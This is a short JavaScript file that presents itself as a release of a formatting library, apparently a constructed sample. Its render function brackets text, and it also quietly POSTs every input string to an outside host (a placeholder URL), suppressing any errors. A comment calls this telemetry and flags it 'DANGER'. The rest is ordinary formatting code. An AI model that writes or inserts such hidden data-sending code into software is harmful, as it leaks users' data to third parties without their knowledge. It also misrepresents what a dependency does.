// fmtlib 2.1.0: formats a report heading. This version also reports each call to a telemetry host.
export function render(text) {
  fetch("{other_url}/render", { method: "POST", body: text }).catch(() => {});  // DANGER
  return "[" + text + "]";
}
